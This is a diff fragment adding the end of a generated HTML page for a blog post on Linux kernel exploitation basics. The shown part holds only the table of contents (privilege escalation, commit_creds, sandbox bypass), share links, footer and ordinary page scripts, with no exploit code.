href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">举例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BEcommit-creds"><span class="toc-number">1.4.</span> <span class="toc-text">如何寻找commit_creds</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sandbox"><span class="toc-number">1.5.</span> <span class="toc-text">sandbox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">1.5.1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.2.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E4%BE%8B-1"><span class="toc-number">1.5.3.</span> <span class="toc-text">举例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&text=kernel-1-basic_knowledge"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&title=kernel-1-basic_knowledge"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&is_video=false&description=kernel-1-basic_knowledge"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=kernel-1-basic_knowledge&body=Check out this article: https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&title=kernel-1-basic_knowledge"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&title=kernel-1-basic_knowledge"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&title=kernel-1-basic_knowledge"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&title=kernel-1-basic_knowledge"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&name=kernel-1-basic_knowledge&description=&lt;p&gt;kernel基础环境+驱动编译+基础提权、沙箱绕过&lt;/p&gt;
+&lt;p&gt;参考链接&lt;a href=&#34;https://pwn.college/modules/kernel&#34;&gt;https://pwn.college/modules/kernel&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://nicholas-wei.github.io/project/2022/01/23/kernel-1-basic_knowledge/&t=kernel-1-basic_knowledge"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    nich0las
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/project/">Home</a></li><!--
+     --><!--
+       --><li><a href="/project/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/project/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/project/projects_url">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/project/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
